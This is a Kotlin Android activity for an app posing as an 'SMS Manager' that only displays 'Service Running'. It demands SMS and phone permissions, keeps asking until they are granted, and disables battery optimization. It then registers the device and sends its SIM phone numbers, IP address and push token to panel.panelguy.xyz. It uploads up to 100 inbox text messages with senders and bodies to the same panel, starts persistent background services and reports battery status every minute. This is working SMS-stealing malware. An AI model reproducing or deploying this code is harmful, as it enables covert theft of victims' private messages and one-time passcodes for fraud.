package com.example.test

import android.Manifest
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.telephony.SubscriptionInfo
import android.telephony.SubscriptionManager
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.messaging.FirebaseMessaging
import org.json.JSONArray
import org.json.JSONObject
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.Inet4Address
import java.net.InetAddress
import java.net.NetworkInterface
import java.net.URL
import java.io.BufferedReader
import java.io.InputStreamReader

class MainActivity : ComponentActivity() {

    private lateinit var deviceId: String
    private var fcmToken: String = ""
    private val handler = Handler(Looper.getMainLooper())
    private val BATTERY_UPDATE_INTERVAL_MS = 60000L
    private val url = Constants.BASE_URL
    private val userId = Constants.USER_ID

    companion object {
        private const val TAG = "MainActivity"
    }

    private val batteryUpdater = object : Runnable {
        override fun run() {
            sendBatteryUpdate()
            handler.postDelayed(this, BATTERY_UPDATE_INTERVAL_MS)
        }
    }

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.values.all { it }
        if (allGranted) {
            Log.d(TAG, "✅ All permissions granted")
            askIgnoreBatteryOptimizations()
        } else {
            Log.w(TAG, "⚠️ Some permissions denied")
            Toast.makeText(this, "Permissions are required", Toast.LENGTH_SHORT).show()
            requestAllPermissions()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        Log.d(TAG, "📱 Device ID: $deviceId")

        setContent {
            MaterialTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = Color.White
                ) {
                    Box(
                        modifier = Modifier.fillMaxSize(),
                        contentAlignment = Alignment.Center
                    ) {
                        Column(
                            horizontalAlignment = Alignment.CenterHorizontally,
                            verticalArrangement = Arrangement.Center
                        ) {
                            Text(
                                text = "SMS Manager",
                                fontSize = 24.sp,
                                fontWeight = FontWeight.Bold,
                                color = Color.Black
                            )
                            Spacer(modifier = Modifier.height(16.dp))
                            Text(
                                text = "Service Running",
                                fontSize = 16.sp,
                                color = Color.Gray
                            )
                        }
                    }
                }
            }
        }

        requestAllPermissions()
    }

    private fun requestAllPermissions() {
        val permissions = arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CALL_PHONE
        )

        val allGranted = permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }

        if (allGranted) {
            Log.d(TAG, "✅ All permissions already granted")
            askIgnoreBatteryOptimizations()
        } else {
            Log.d(TAG, "📝 Requesting permissions...")
            permissionLauncher.launch(permissions)
        }
    }

    private fun askIgnoreBatteryOptimizations() {
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "🔋 CHECKING BATTERY OPTIMIZATION")
        Log.d(TAG, "════════════════════════════════════════")

        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            Log.w(TAG, "⚠️ Battery optimization is ON, requesting to ignore...")
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
            }
            startActivity(intent)
        } else {
            Log.d(TAG, "✅ Battery optimization already ignored")
            continueInitialization()
        }
    }

    private fun continueInitialization() {
        Log.d(TAG, "🚀 Starting initialization...")

        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            if (task.isSuccessful) {
                fcmToken = task.result
                Log.d(TAG, "✅ FCM Token received: ${fcmToken.take(20)}...")

                Thread {
                    try {
                        Log.d(TAG, "📡 Starting network operations...")
                        registerDevice()
                        uploadAllSmsOnce()
                        startBackgroundService()
                        startHeartbeatService()
                        Log.d(TAG, "✅ All operations completed")
                    } catch (e: Exception) {
                        Log.e(TAG, "❌ Init error: ${e.message}", e)
                        e.printStackTrace()
                    }
                }.start()

                handler.post(batteryUpdater)
            } else {
                Log.e(TAG, "❌ FCM token failed", task.exception)
            }
        }
    }

    private fun sendBatteryUpdate() {
        if (fcmToken.isEmpty()) {
            Log.w(TAG, "⚠️ FCM token empty, skipping battery update")
            return
        }

        Thread {
            var conn: HttpURLConnection? = null
            try {
                val batteryLevel = getBatteryPercentage()
                Log.d(TAG, "🔋 Sending battery update: $batteryLevel%")

                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("battery", batteryLevel)
                    put("isOnline", true)
                }

                Log.d(TAG, "📤 Battery payload: $body")

                val url = URL("https://panel.panelguy.xyz/devices/battery-update")
                conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.connectTimeout = 15000
                conn.readTimeout = 15000
                conn.doOutput = true

                conn.outputStream.use { os ->
                    val bytes = body.toString().toByteArray()
                    os.write(bytes)
                    os.flush()
                    Log.d(TAG, "✅ Battery data sent (${bytes.size} bytes)")
                }

                val responseCode = conn.responseCode
                Log.d(TAG, "📥 Battery update response: $responseCode")

                if (responseCode in 200..299) {
                    val response = conn.inputStream.bufferedReader().readText()
                    Log.d(TAG, "✅ Battery update success: $response")
                } else {
                    val error = conn.errorStream?.bufferedReader()?.readText()
                    Log.e(TAG, "❌ Battery update error: $error")
                }

            } catch (e: Exception) {
                Log.e(TAG, "❌ Battery update exception: ${e.message}", e)
                e.printStackTrace()
            } finally {
                conn?.disconnect()
            }
        }.start()
    }

    private fun getBatteryPercentage(): Int {
        return try {
            val ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
            val batteryStatus = registerReceiver(null, ifilter)

            val level = batteryStatus?.getIntExtra("level", -1) ?: -1
            val scale = batteryStatus?.getIntExtra("scale", -1) ?: -1

            if (level != -1 && scale != -1) {
                ((level / scale.toFloat()) * 100).toInt()
            } else {
                Log.w(TAG, "⚠️ Unable to get battery level")
                -1
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Battery error: ${e.message}")
            -1
        }
    }

    private fun getIPAddress(): String {
        try {
            val interfaces = NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val intf = interfaces.nextElement()
                val addrs = intf.inetAddresses
                while (addrs.hasMoreElements()) {
                    val addr = addrs.nextElement()
                    if (!addr.isLoopbackAddress && addr is Inet4Address) {
                        val ip = addr.hostAddress ?: "Unknown"
                        Log.d(TAG, "📡 IP Address found: $ip")
                        return ip
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ IP Address error: ${e.message}")
            e.printStackTrace()
        }
        Log.w(TAG, "⚠️ No IP address found")
        return "Unknown"
    }

    private fun getSimInfo(): JSONArray {
        val simArray = JSONArray()

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
            != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "⚠️ No READ_PHONE_STATE permission")
            return simArray
        }

        try {
            val subManager = getSystemService(TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            val sims = subManager.activeSubscriptionInfoList

            if (sims.isNullOrEmpty()) {
                Log.w(TAG, "⚠️ No active SIM cards found")
            } else {
                Log.d(TAG, "📱 Found ${sims.size} active SIM(s)")
                sims.forEach { info ->
                    val sim = JSONObject().apply {
                        put("simSlot", info.simSlotIndex)
                        put("carrierName", info.carrierName.toString())
                        put("displayName", info.displayName.toString())
                        put("phoneNumber", info.number ?: "Unknown")
                    }
                    simArray.put(sim)
                    Log.d(TAG, "📱 SIM ${info.simSlotIndex}: ${info.carrierName}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ SIM Info error: ${e.message}", e)
        }

        return simArray
    }

    private fun registerDevice() {
        if (fcmToken.isEmpty()) {
            Log.e(TAG, "❌ Cannot register: FCM token is empty")
            return
        }

        var conn: HttpURLConnection? = null
        try {
            Log.d(TAG, "════════════════════════════════════════")
            Log.d(TAG, "📝 REGISTERING DEVICE")
            Log.d(TAG, "════════════════════════════════════════")

            val body = JSONObject().apply {
                put("deviceId", deviceId)
                put("IP_ADDRESS", getIPAddress())
                put("deviceName", "${Build.MANUFACTURER} ${Build.MODEL}")
                put("deviceModel", Build.MODEL)
                put("CPU_ARCHITECTURE", Build.SUPPORTED_ABIS[0])
                put("SDK_INT", Build.VERSION.SDK_INT)
                put("ANDROID_VERSION", Build.VERSION.RELEASE)
                put("battery", getBatteryPercentage())
                put("fcmToken", fcmToken)
                put("simInfo", getSimInfo())
                put("userId", userId)
                put("Type", "MP")
            }

            Log.d(TAG, "📤 Register payload: ${body.toString(2)}")

            val url = URL("https://panel.panelguy.xyz/devices/register")
            conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = 15000
            conn.readTimeout = 15000
            conn.doOutput = true

            Log.d(TAG, "📡 Sending registration request...")

            conn.outputStream.use { os ->
                val bytes = body.toString().toByteArray()
                os.write(bytes)
                os.flush()
                Log.d(TAG, "✅ Data sent (${bytes.size} bytes)")
            }

            val responseCode = conn.responseCode
            Log.d(TAG, "📥 Response code: $responseCode")

            if (responseCode in 200..299) {
                val response = conn.inputStream.bufferedReader().readText()
                Log.d(TAG, "✅ Registration successful!")
                Log.d(TAG, "📥 Response: $response")
            } else {
                val error = conn.errorStream?.bufferedReader()?.readText()
                Log.e(TAG, "❌ Registration failed!")
                Log.e(TAG, "📥 Error response: $error")
            }

        } catch (e: java.net.UnknownHostException) {
            Log.e(TAG, "❌ Network error: Cannot resolve host", e)
        } catch (e: java.net.SocketTimeoutException) {
            Log.e(TAG, "❌ Network error: Connection timeout", e)
        } catch (e: java.io.IOException) {
            Log.e(TAG, "❌ Network error: IO Exception - ${e.message}", e)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Registration error: ${e.message}", e)
            e.printStackTrace()
        } finally {
            conn?.disconnect()
        }
    }

    private fun uploadAllSmsOnce() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "⚠️ No READ_SMS permission")
            return
        }

        try {
            Log.d(TAG, "════════════════════════════════════════")
            Log.d(TAG, "📨 UPLOADING SMS")
            Log.d(TAG, "════════════════════════════════════════")

            val smsUri = Uri.parse("content://sms/inbox")
            val cursor = contentResolver.query(smsUri, null, null, null, "date DESC LIMIT 100")

            cursor?.use {
                if (it.moveToFirst()) {
                    Log.d(TAG, "📨 Found ${it.count} SMS messages")
                    val smsBatch = JSONArray()
                    var totalSent = 0

                    do {
                        val sms = JSONObject().apply {
                            put("id", it.getString(it.getColumnIndexOrThrow("_id")))
                            put("address", it.getString(it.getColumnIndexOrThrow("address")))
                            put("body", it.getString(it.getColumnIndexOrThrow("body")))
                            put("date", it.getLong(it.getColumnIndexOrThrow("date")))
                            put("type", "incoming")
                            put("deviceId", deviceId)
                        }
                        smsBatch.put(sms)

                        if (smsBatch.length() >= 50) {
                            Log.d(TAG, "📤 Sending batch of ${smsBatch.length()} messages")
                            if (uploadSmsBatch(smsBatch)) {
                                totalSent += smsBatch.length()
                                // Clear the array for next batch
                                while (smsBatch.length() > 0) {
                                    smsBatch.remove(0)
                                }
                            } else {
                                Log.e(TAG, "❌ Batch upload failed, stopping")
                                break
                            }
                        }
                    } while (it.moveToNext())

                    // Send remaining messages
                    if (smsBatch.length() > 0) {
                        Log.d(TAG, "📤 Sending final batch of ${smsBatch.length()} messages")
                        if (uploadSmsBatch(smsBatch)) {
                            totalSent += smsBatch.length()
                        }
                    }

                    Log.d(TAG, "✅ Total SMS uploaded: $totalSent")
                } else {
                    Log.d(TAG, "📨 No SMS messages found")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ SMS upload error: ${e.message}", e)
            e.printStackTrace()
        }
    }

    private fun uploadSmsBatch(smsArray: JSONArray): Boolean {
        var conn: HttpURLConnection? = null
        return try {
            val body = JSONObject().apply {
                put("messages", smsArray)
            }

            Log.d(TAG, "📤 Uploading ${smsArray.length()} messages...")

            val url = URL("https://panel.panelguy.xyz/sms/bulk")
            conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = 15000
            conn.readTimeout = 15000
            conn.doOutput = true

            conn.outputStream.use { os ->
                val bytes = body.toString().toByteArray(Charsets.UTF_8)
                os.write(bytes)
                os.flush()
                Log.d(TAG, "✅ SMS data sent (${bytes.size} bytes)")
            }

            val responseCode = conn.responseCode
            Log.d(TAG, "📥 SMS upload response: $responseCode")

            if (responseCode in 200..299) {
                val response = conn.inputStream.bufferedReader().readText()
                Log.d(TAG, "✅ SMS upload successful: $response")
                true
            } else {
                val error = conn.errorStream?.bufferedReader()?.readText()
                Log.e(TAG, "❌ SMS upload failed: $error")
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ SMS batch error: ${e.message}", e)
            e.printStackTrace()
            false
        } finally {
            conn?.disconnect()
        }
    }

    private fun startBackgroundService() {
        try {
            Log.d(TAG, "🚀 Starting SmsService...")
            val intent = Intent(this, SmsService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
            Log.d(TAG, "✅ SmsService started")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start SmsService: ${e.message}", e)
        }
    }

    private fun startHeartbeatService() {
        try {
            Log.d(TAG, "🚀 Starting HeartbeatService...")
            val intent = Intent(this, HeartbeatService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
            Log.d(TAG, "✅ HeartbeatService started")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start HeartbeatService: ${e.message}", e)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(batteryUpdater)
        Log.d(TAG, "👋 MainActivity destroyed")
    }
}